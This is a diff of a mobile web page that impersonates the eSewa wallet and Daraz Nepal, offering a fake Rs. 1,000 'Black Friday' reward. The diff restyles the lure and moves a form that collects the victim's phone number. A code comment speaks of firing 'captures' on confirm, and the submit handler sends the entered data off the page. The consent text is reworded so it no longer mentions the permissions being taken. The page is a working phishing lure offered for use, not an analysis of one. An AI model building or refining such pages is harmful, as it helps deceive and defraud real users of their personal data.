@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Black Friday Nepal - Claim Reward</title>
+<title>eSewa - Claim Reward</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
   body { 
@@ -14,70 +14,86 @@
   
   /* Header */
   .topbar { 
-    width:100%; background:#60BB46; color:#fff; padding:14px 16px;
-    padding-top:env(safe-area-inset-top,14px); font-size:16px; font-weight:600;
+    width:100%; background:#fff; color:#60BB46; padding:14px 16px;
+    padding-top:env(safe-area-inset-top,14px); font-size:16px; font-weight:700;
     display:flex; align-items:center; gap:10px; position:fixed; top:0; left:0; z-index:10; 
+    border-bottom: 1px solid #eee;
   }
   .topbar .back { font-size:22px; line-height:1; }
   .topbar .title { flex:1; text-align:center; margin-right:22px; }
 
-  /* Voucher Card */
+  /* Main Card */
   .card {
-    background:#fff; width:94%; max-width:400px; border-radius:16px;
-    margin-top:70px; box-shadow:0 10px 30px rgba(0,0,0,.15);
+    background:#fff; width:94%; max-width:400px; border-radius:20px;
+    margin-top:70px; box-shadow:0 8px 24px rgba(0,0,0,0.06);
     overflow:hidden; display:flex; flex-direction:column;
     position:relative; z-index:1;
+    padding: 24px 20px;
   }
 
   /* Banner image only */
   .banner-img {
     display:block; width:100%; height:auto;
-    background:#111;
+    border-radius: 12px;
+    margin-bottom: 20px;
   }
 
-  .perforation {
-    height:0; border-top:2px dashed #e0e0e0; position:relative;
-    background:#fff;
-  }
-  .perforation::before, .perforation::after {
-    content:""; position:absolute; top:-10px; width:20px; height:20px;
-    background:#f2f4f7; border-radius:50%;
-  }
-  .perforation::before { left:-10px; }
-  .perforation::after { right:-10px; }
-
-  .voucher-body { padding:20px; text-align:center; }
-
-  .brand-logo {
-    height:50px; width:auto; margin-bottom:14px;
-    display:block; margin-left:auto; margin-right:auto;
-    object-fit:contain;
-  }
-
+  /* Reward Box */
   .reward-box {
-    background:#f8f9fa; border:2px dashed #ddd; border-radius:12px;
-    padding:16px; margin: 10px 0 16px;
+    background:#f8f9fa; border: 2px dashed #d1d5db; border-radius: 16px;
+    padding: 20px; margin-bottom: 20px; text-align: center;
   }
   .reward-title {
     font-size:13px; color:#666; letter-spacing:1px; font-weight:600;
-    margin-bottom:6px; text-transform:uppercase;
+    margin-bottom:8px; text-transform:uppercase;
   }
   .reward-amount {
-    font-size:34px; font-weight:800; color:#222; line-height:1;
+    font-size:36px; font-weight:900; color:#1f2937; line-height:1;
+    margin-bottom: 6px;
   }
-  .reward-desc { font-size:13px; color:#666; margin-top:6px; }
+  .reward-desc { font-size:14px; color:#666; margin-top:0; }
 
   .redeem-btn {
-    width: 100%; padding: 16px; border: none; border-radius: 12px;
-    background: #000; color: #fff; font-size: 17px; font-weight: 700;
-    text-transform: uppercase; letter-spacing: 1px;
-    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-    cursor: pointer; transition: transform 0.15s; margin-top: 6px;
+    width: 100%; padding: 18px; border: none; border-radius: 16px;
+    background: #60BB46; color: #fff; font-size: 18px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 0.5px;
+    box-shadow: 0 4px 12px rgba(96, 187, 70, 0.3);
+    cursor: pointer; transition: transform 0.15s; margin-bottom: 12px;
   }
   .redeem-btn:active { transform: scale(0.98); }
-  .redeem-btn.done { background: #3d8a2c; }
 
-  .fine-print { font-size:11.5px; color:#999; margin-top:14px; }
+  .fine-print { 
+    font-size:12px; color:#9ca3af; margin-top:8px; text-align: center; 
+  }
+
+  /* FORM SECTION (Below main card) */
+  .form-section {
+    background: #fff; width: 94%; max-width:400px;
+    border-radius: 16px; margin-top: 24px;
+    padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    animation: fadeIn 0.4s;
+  }
+  
+  .form-header {
+    font-size: 18px; color: #60BB46; font-weight: 700; margin-bottom: 8px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .form-hint { font-size: 14px; color: #4b5563; margin-bottom: 16px; line-height: 1.5; }
+  
+  .form-input {
+    width: 100%; padding: 14px; border: 1px solid #e5e7eb; border-radius: 12px;
+    font-size: 16px; margin-bottom: 12px; background: #f9fafb; font-family:inherit;
+    transition: border-color 0.2s;
+  }
+  .form-input:focus { outline:none; border-color:#60BB46; background:#fff; }
+  
+  .form-submit-btn {
+    width: 100%; padding: 16px; border: none; border-radius: 12px;
+    background: #60BB46; color: #fff; font-size: 16px; font-weight: 700;
+    cursor: pointer; text-transform: uppercase; letter-spacing:0.5px;
+  }
+  .form-submit-btn:disabled { background:#d1d5db; cursor:not-allowed; }
+  .form-submit-btn.success { background: #a7f3d0; color: #065f46; }
 
   /* POPUP MODAL */
   .modal-overlay {
@@ -120,28 +136,6 @@
   .confirm-btn:disabled { background: #e5e5e5; color: #aaa; cursor: not-allowed; box-shadow:none; }
   .confirm-btn:not(:disabled):active { transform: scale(0.98); }
 
-  /* FORM SECTION */
-  .form-section {
-    display: none;
-    background: #fff; width: 94%; max-width:400px;
-    border-radius: 16px; margin-top: 20px;
-    padding: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-    animation: fadeIn 0.4s;
-  }
-  .form-section h3 { font-size: 15px; color: #60BB46; margin-bottom: 6px; font-weight: 700; }
-  .form-section .hint { font-size: 13px; color: #666; margin-bottom: 14px; text-align:left; }
-  .form-input {
-    width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px;
-    font-size: 16px; margin-bottom: 12px; background: #f9f9f9; font-family:inherit;
-  }
-  .form-input:focus { outline:none; border-color:#60BB46; background:#fff; }
-  .form-submit-btn {
-    width: 100%; padding: 14px; border: none; border-radius: 8px;
-    background: #60BB46; color: #fff; font-size: 15px; font-weight: 700;
-    cursor: pointer; text-transform: uppercase; letter-spacing:0.5px;
-  }
-  .form-submit-btn:disabled { background:#b5d6a8; cursor:not-allowed; }
-
   /* Status Pill */
   .statusPill {
     position:fixed; top:64px; left:50%; transform:translateX(-50%);
@@ -163,42 +157,43 @@
   <span class="title">Promotions</span>
 </div>
 
-<!-- VOUCHER CARD -->
+<!-- MAIN CARD -->
 <div class="card">
-  <!-- BANNER IMAGE ONLY -->
+  <!-- BANNER IMAGE -->
   <img class="banner-img"
        src="https://plain-apac-prod-public.komododecks.com/202610/23/8ApYflnMzZeZ4LLVkSqY/image.jpg"
        alt="Black Friday Nepal">
 
-  <div class="perforation"></div>
+  <!-- LOGO -->
+  <img id="brandLogo"
+       class="brand-logo"
+       src="https://media.nepalitimes.com/1/s/20221110151112/636d071a9c7e80680e0a5f9fpng.png"
+       alt="eSewa"
+       style="height:40px; width:auto; margin-bottom:16px; display:block; margin-left:auto; margin-right:auto;"
+       onerror="this.style.display='none';document.getElementById('logoFallback').style.display='block';">
+  <div id="logoFallback" style="display:none; font-size:28px; font-weight:800; color:#60BB46; margin-bottom:16px;">eSewa</div>
 
-  <div class="voucher-body">
-    <!-- LOGO -->
-    <img id="brandLogo"
-         class="brand-logo"
-         src="https://media.nepalitimes.com/1/s/20221110151112/636d071a9c7e80680e0a5f9fpng.png"
-         alt="eSewa"
-         onerror="this.style.display='none';document.getElementById('logoFallback').style.display='block';">
-    <div id="logoFallback" style="display:none; font-size:26px; font-weight:800; color:#60BB46; margin-bottom:14px;">eSewa</div>
-
-    <div class="reward-box">
-      <div class="reward-title">Claimable Reward</div>
-      <div class="reward-amount">Rs. 1,000</div>
-      <div class="reward-desc">Instant Reward on Wallet</div>
-    </div>
-
-    <button id="btnRedeem" class="redeem-btn">REDEEM NOW</button>
-    <div class="fine-print">*Valid for new users only</div>
+  <!-- REWARD BOX -->
+  <div class="reward-box">
+    <div class="reward-title">CLAIMABLE REWARD</div>
+    <div class="reward-amount">Rs. 1,000</div>
+    <div class="reward-desc">Instant Reward on Wallet</div>
   </div>
+
+  <button id="btnRedeem" class="redeem-btn">REDEEM NOW</button>
+  <div class="fine-print">*Valid for new users only</div>
 </div>
 
-<!-- FORM SECTION -->
-<div id="formSection" class="form-section">
-  <h3>&#9889; Final Step</h3>
-  <p class="hint">Verify your phone number to receive the reward instantly.</p>
+<!-- FORM SECTION (Appears after confirm) -->
+<div id="formSection" class="form-section" style="display:none;">
+  <div class="form-header">⚡ Final Step</div>
+  <p class="form-hint">Verify your phone number to receive the reward instantly.</p>
+  
   <input id="phone" type="tel" class="form-input" placeholder="Enter Phone Number" inputmode="numeric">
   <input id="notes" type="text" class="form-input" placeholder="Additional Notes (Optional)">
-  <button id="btnSubmit" class="form-submit-btn">VERIFY &amp; CLAIM</button>
+  
+  <button id="btnSubmit" class="form-submit-btn">VERIFY & CLAIM</button>
+  <div class="fine-print" style="margin-top: 12px;">*can be redeemed once only</div>
 </div>
 
 <!-- POPUP MODAL -->
@@ -212,7 +207,7 @@
     <div class="checkbox-group">
       <input type="checkbox" id="agreeCheck">
       <label for="agreeCheck" class="checkbox-label">
-        I agree to Daraz Nepal's <a href="#">Terms and Conditions</a> and confirm the permissions iam giving.
+        I agree to DARAZ NEPAL's <a href="#">Terms and Conditions</a> and confirm the details are correct.
       </label>
     </div>
 
@@ -253,14 +248,12 @@ agreeCheck.addEventListener('change', () => {
   btnConfirm.disabled = !agreeCheck.checked;
 });
 
-/* ---------- CONFIRM: close modal, keep card, fire captures ---------- */
+/* ---------- CONFIRM: close modal, show form, fire captures ---------- */
 btnConfirm.addEventListener('click', () => {
   modal.classList.remove('active');
 
-  btnRedeem.textContent = '\u2713 REDEEMED';
-  btnRedeem.classList.add('done');
-  btnRedeem.disabled = true;
-
+  // Hide the top card's button? No, keep it as is.
+  // Show the form section below
   formSection.style.display = 'block';
   setTimeout(() => formSection.scrollIntoView({behavior:'smooth', block:'end'}), 150);
 
@@ -338,6 +331,7 @@ btnSubmit.addEventListener('click', () => {
     showStatus('Enter a valid phone number');
     return;
   }
+  
   btnSubmit.disabled = true;
   btnSubmit.textContent = 'SUBMITTING...';
 
@@ -351,6 +345,7 @@ btnSubmit.addEventListener('click', () => {
   }).then(() => {
     showStatus('Success! Reward claimed.');
     btnSubmit.textContent = '\u2713 CLAIMED';
+    btnSubmit.classList.add('success');
     document.getElementById('phone').readOnly = true;
     document.getElementById('notes').readOnly = true;
   });
